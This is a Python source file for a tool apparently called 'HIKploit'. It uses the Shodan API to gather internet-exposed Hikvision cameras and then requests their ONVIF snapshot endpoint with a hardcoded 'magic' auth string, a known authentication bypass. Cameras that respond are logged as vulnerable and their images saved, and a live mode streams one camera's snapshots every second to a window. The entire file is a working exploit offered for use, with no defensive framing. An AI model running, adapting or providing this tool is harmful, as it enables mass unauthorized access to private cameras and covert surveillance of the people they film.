#!/bin/python3

import shodan, requests, sys, time, pathlib, tkinter, io
from PIL import Image
from PIL import ImageTk

#Vulnerability analysis constants
HIKVISION_SHODAN_QUERY = "App-webs+200+OK"
HIKVISION_MAGIC_AUTH = "?auth=YWRtaW46MTEK"
SNAPSHOT_SUFFIX = "/onvif-http/snapshot"

# Data gathering variables
shodan_api_key = ""
city_filter = ""
country_filter = ""
gather_limit = 0
ipList = []

# Data analysis variables
filename = ""
ipVuln = []
custom_timeout = 1

# Live variables
live_target = ""
live_timeout = 1
show_image = True

# Data gathering functions

def getShodanIPs():
    try:
        global ipList
        ipList = []
        api = shodan.Shodan(shodan_api_key)
        query = HIKVISION_SHODAN_QUERY

        if city_filter != "":
            query += " +City:"+city_filter
        if country_filter != "":
            query += " +Country:"+country_filter

        results = api.search(query)
        if results['total'] > 100:
            if  gather_limit == 0: 
                print('Found a total of {} potentially cameras.'.format(results['total']))
                print('This exceeds the free 100 entries from Shodan without consuming query tokens')
                print('Write \'ALL\' to get all tickets (will consume {} tokens)'.format(calcTokens(results['total'])))
                print('Write \'FREE\' to get the free first 100  entries')
                print('Write a number to get that number of entries (will consume a token each 100)')
                handleInput(api, query, results)
            else:
                getEntriesWithTokens(gather_limit, api, query)
        else:
            getFreeEntries(api, query)

        if len(ipList) > 0:
            saveIpList()
            
    except shodan.APIError as e:
            print('Error: {}'.format(e))

def checkInput(input):
    try:
        val = int(input)
        return val
    except ValueError:
        return input.upper()

def handleInput(api, query, results):
    choice = checkInput(input())
    if isinstance(choice, int):
        if choice >= 100:
            getEntriesWithTokens(choice, api, query)
        else:
            print('Please enter a number bigger than 100')
    else:
        if choice == 'ALL': 
            print('Obtaining all entries. This might take some minutes, please wait...')
            getEntriesWithTokens(calcTokens(results['total']) * 100, api, query)
        elif choice == 'FREE':
            getFreeEntries(api, query)
        else:
            print('Wrong input.')

def calcTokens(entries):
    while entries % 100 != 0:
        entries +=1
    return int(entries / 100)

def getEntriesWithTokens(entryLimit, api, query):
    global ipList
    counter = 0
    for result in api.search_cursor(query):
        ipList.append(result['ip_str']+':'+str(result['port']))
        counter += 1
        if counter == entryLimit:
            break

def getFreeEntries(api, query):
    global ipList
    results = api.search(query)    
    for result in results['matches']:
        ipList.append(result['ip_str']+':'+str(result['port']))

def saveIpList():
    pathlib.Path("target").mkdir(parents=True, exist_ok=True)
    save_filename = "target/"+time.strftime("%Y%m%d-%H%M%s")+".txt"
    with open(save_filename, 'w') as f:
        newline = ''
        for line in ipList:
            f.write(newline +line)
            newline = '\n'
        f.close()
    print("File {} created with {} IPs.".format(save_filename, len(ipList)))

# Analysis functions

def readFile():
    with open(filename, 'r') as f:
        global ipList
        ipList = f.read().split('\n')
    f.close()

def checkIPs(): 
    print('Checking for vulnerable cameras.')
    global ipVuln
    ipVuln = []
    idx = 1
    for ip in ipList:
        try:
            response = requests.get('http://'+ip+SNAPSHOT_SUFFIX+HIKVISION_MAGIC_AUTH, timeout=custom_timeout)
            if response.status_code == 200:
                ipVuln.append(ip)
                saveSnapshot(ip, response)

        except requests.exceptions.RequestException as e:
            pass
        print("Scanned {} of {} IPs.".format(idx,len(ipList)), end="\r")
        idx+=1

    if len(ipVuln) > 0:
        print("Found {} vulnerable cameras".format(len(ipVuln)))
        saveVulnInFile()
    else:
        print("No vulnerable cameras found.")


def saveSnapshot(ip, response):
    pathlib.Path('snap/'+ip).mkdir(parents=True, exist_ok=True)
    with open('snap/'+ip+'/'+time.strftime("%Y%m%d-%H%M%s")+'.jpg', 'wb' ) as f:
        f.write(response.content)
        f.close()

def saveVulnInFile():
    pathlib.Path("vuln").mkdir(parents=True, exist_ok=True)
    save_filename = "vuln/"+time.strftime("%Y%m%d-%H%M%s")+".txt"
    with open(save_filename, 'w') as f:
        newline = ''
        for line in ipVuln:
            f.write(newline +line)
            newline = '\n'
        f.close()
    print("Vulnerable IPs saved in {}.".format(save_filename))

# Live functions

def live(ip):
    print("Saving snapshots on "+'snap/'+ip+'/')
    if show_image:
        root = tkinter.Tk()
        root.title("HIKploit LIVE {}".format(ip))
        image = getImageForDraw(ip)
        widget = tkinter.Label(root, image=image)
        widget.grid(row=0, column=0)
        changeImage(widget, ip, root)
        root.mainloop()
    else:
        while True:
            resp = getLiveImage(ip)
            if (resp):
                saveSnapshot(ip, resp)
            time.sleep(1)

def getLiveImage(ip):
    global live_timeout
    try:
        response = requests.get('http://'+ip+SNAPSHOT_SUFFIX+HIKVISION_MAGIC_AUTH, timeout=live_timeout)
        if response.elapsed.total_seconds() < live_timeout and live_timeout > 1:
            print("Obtained faster response, decreasing timeout in 1 second ({}).".format(live_timeout -1))
            live_timeout -= 1
        return response;
    except Exception as e:
        print('A timeout error has occurred. Incrementing timeout 1 second ({}).'.format(live_timeout + 1))
        live_timeout += 1
        return None

def getImageForDraw(ip):
    global live_timeout

    resp = getLiveImage(ip)
    if resp != None:
        im = Image.open(io.BytesIO(resp.content))
        im = im.resize((1280, 720), Image.ANTIALIAS)
        image = ImageTk.PhotoImage(im)
        saveSnapshot(ip, resp)
        return image

def changeImage(widget, ip, root):
    image = getImageForDraw(ip)
    if show_image:
        widget.configure(image=image)
        widget.image = image
    root.after(1000, lambda: changeImage(widget, ip, root))

# Main execution functions

def readArguments():
    # Number of arguments
    n = len(sys.argv)
    # Arguments passed
    for i in range(1, n):
        #Excution type
        if sys.argv[i] == "--gather" or sys.argv[i] == "-g":
            global shodan_api_key
            shodan_api_key = sys.argv[i+1]
            i+=1
            continue
        if sys.argv[i] == "--check" or sys.argv[i] == "-c":
            global filename
            filename = sys.argv[i+1]
            i+=1
            continue
        if sys.argv[i] == "--live" or sys.argv[i] == "-l":
            global is_live_mode
            global live_target
            is_live_mode = True
            live_target = sys.argv[i + 1]
            i+=1
            continue
        if sys.argv[i] == "--no-image":
            global show_image
            show_image = False;
            i+=1
            continue
        #Shodan arguments
        if shodan_api_key != "": 
            if sys.argv[i] == "--filter-city":
                global city_filter
                city_filter = sys.argv[i+1]
                i+=1
                continue
            if sys.argv[i] == "--filter-country":
                global country_filter
                country_filter = sys.argv[i+1]
                i+=1
                continue
            if sys.argv[i] == "--limit":
                global gather_limit
                gather_limit = int(sys.argv[i+1])
                i+=1
                continue
        
        #Common arguments
        if sys.argv[i] == "--timeout" or sys.argv[i] == "-t":
                global custom_timeout
                custom_timeout = int(sys.argv[i+1])
                i+=1
                continue

def main():
    readArguments()
    if shodan_api_key != "":
        getShodanIPs()
    elif filename != "":
        readFile()
        checkIPs()
    elif is_live_mode:
        live(live_target)

main()